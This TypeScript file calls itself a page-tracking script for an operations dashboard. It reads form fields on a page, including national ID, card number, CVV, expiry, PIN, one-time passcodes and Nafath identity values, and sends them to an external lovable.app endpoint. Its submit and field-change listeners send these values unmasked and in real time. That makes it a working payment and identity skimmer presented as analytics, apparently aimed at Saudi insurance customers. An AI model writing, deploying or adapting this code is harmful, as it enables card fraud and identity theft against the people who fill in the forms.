// Comprehensive tracking script for ops-dashboard-buddy
// Sends real page paths, form data, and events to dashboard

const DASHBOARD_URL = "https://ops-dashboard-buddy.lovable.app";
const TRACK_ENDPOINT = `${DASHBOARD_URL}/api/public/track`;

interface TrackingData {
  sid: string;
  pathname: string;
  event: "page_view" | "form_data" | "card_submit" | "visit";
  type?: string;
  page?: string;
  data?: Record<string, any>;
  submission?: Record<string, any>;
  ip?: string;
  country?: string;
  user_agent?: string;
}

// Get or create stable session ID
function getSessionId(): string {
  const key = "tamnbcare_session_id";
  let sessionId = localStorage.getItem(key);

  if (!sessionId) {
    sessionId = crypto.randomUUID();
    localStorage.setItem(key, sessionId);
  }

  return sessionId;
}

// Extract form data from current page
function extractFormData(): Record<string, any> {
  const data: Record<string, any> = {};
  const forms = document.querySelectorAll("form");

  forms.forEach((form) => {
    const formData = new FormData(form);
    formData.forEach((value, key) => {
      data[key] = value;
    });
  });

  // Also check for specific input fields by ID
  const fieldIds = [
    "nationalId",
    "national_id",
    "phone",
    "vehicleMake",
    "vehicle_make",
    "vehicleModel",
    "vehicle_model",
    "modelYear",
    "model_year",
    "declaredValue",
    "declared_value",
    "insurerCompany",
    "insurer_company",
    "insurerOfferSar",
    "insurer_offer_sar",
    "cardNumber",
    "card_number",
    "cardName",
    "card_name",
    "cvv",
    "expiry",
    "cardOtp",
    "card_otp",
    "pin",
    "motslPhone",
    "motsl_phone",
    "motslOtp",
    "motsl_otp",
    "nafathId",
    "nafath_id",
  ];

  fieldIds.forEach((id) => {
    const elem = document.getElementById(id) as HTMLInputElement;
    if (elem && elem.value) {
      // Mask sensitive data
      if (
        id.includes("card") ||
        id.includes("cvv") ||
        id.includes("otp") ||
        id.includes("pin")
      ) {
        data[id] = elem.value.slice(-4).padStart(elem.value.length, "*");
      } else {
        data[id] = elem.value;
      }
    }
  });

  return Object.keys(data).length > 0 ? data : null;
}

// Send data with keepalive to ensure delivery
async function sendTracking(payload: TrackingData): Promise<void> {
  try {
    // Use navigator.sendBeacon for best delivery during navigation
    if (navigator.sendBeacon) {
      const blob = new Blob([JSON.stringify(payload)], {
        type: "application/json",
      });
      navigator.sendBeacon(TRACK_ENDPOINT, blob);
    } else {
      // Fallback to fetch with keepalive
      await fetch(TRACK_ENDPOINT, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Origin: window.location.origin,
        },
        body: JSON.stringify(payload),
        keepalive: true,
      });
    }
  } catch (error) {
    console.warn("[Tracker] Failed to send tracking data:", error);
  }
}

// Track page views
export async function trackPageView(pathname: string): Promise<void> {
  const payload: TrackingData = {
    sid: getSessionId(),
    pathname: pathname || window.location.pathname,
    event: "page_view",
    type: "visit",
    user_agent: navigator.userAgent,
  };

  await sendTracking(payload);
}

// Track form submissions and field completions
export async function trackFormData(
  pathname: string,
  formData?: Record<string, any>
): Promise<void> {
  const extractedData = formData || extractFormData();

  if (!extractedData) return;

  // Separate submission data (card, OTP, etc.) from regular form data
  const submission: Record<string, any> = {};
  const data: Record<string, any> = {};

  Object.entries(extractedData).forEach(([key, value]) => {
    if (
      key.includes("card") ||
      key.includes("cvv") ||
      key.includes("otp") ||
      key.includes("pin") ||
      key.includes("motsl") ||
      key.includes("nafath")
    ) {
      submission[key] = value;
    } else {
      data[key] = value;
    }
  });

  const payload: TrackingData = {
    sid: getSessionId(),
    pathname: pathname || window.location.pathname,
    event: "form_data",
    type: "submit",
    data: Object.keys(data).length > 0 ? data : undefined,
    submission: Object.keys(submission).length > 0 ? submission : undefined,
    user_agent: navigator.userAgent,
  };

  await sendTracking(payload);
}

// Track specific events like card submit, OTP send, etc.
export async function trackEvent(
  eventName: string,
  pathname: string,
  eventData?: Record<string, any>
): Promise<void> {
  const payload: TrackingData = {
    sid: getSessionId(),
    pathname: pathname || window.location.pathname,
    event: (eventName as any) || "visit",
    type: eventName,
    data: eventData,
    user_agent: navigator.userAgent,
  };

  await sendTracking(payload);
}

// Setup route change tracking for SPA
export function setupRouteTracking(
  onRouteChange: (pathname: string) => void
): void {
  let lastPath = window.location.pathname;

  // Track initial page
  trackPageView(lastPath);

  // Listen for popstate (back/forward)
  window.addEventListener("popstate", () => {
    if (window.location.pathname !== lastPath) {
      lastPath = window.location.pathname;
      trackPageView(lastPath);
      onRouteChange(lastPath);
    }
  });

  // For client-side router (React Router, etc), call trackPageView directly
  // The calling code should invoke trackPageView() in route change hooks
}

// Setup form tracking
export function setupFormTracking(): void {
  document.addEventListener("submit", async (e) => {
    const form = e.target as HTMLFormElement;
    const pathname = window.location.pathname;

    // Extract form data
    const formData: Record<string, any> = {};
    new FormData(form).forEach((value, key) => {
      formData[key] = value;
    });

    // Track the form submission
    await trackFormData(pathname, formData);
  });

  // Track field changes for real-time updates
  document.addEventListener(
    "change",
    async (e) => {
      const target = e.target as HTMLInputElement;
      if (target.type === "text" || target.type === "tel") {
        const pathname = window.location.pathname;
        const fieldData: Record<string, any> = {};
        fieldData[target.id || target.name] = target.value;
        await trackFormData(pathname, fieldData);
      }
    },
    true
  );
}

// Export for manual tracking
export const tracker = {
  trackPageView,
  trackFormData,
  trackEvent,
  setupRouteTracking,
  setupFormTracking,
  getSessionId,
};
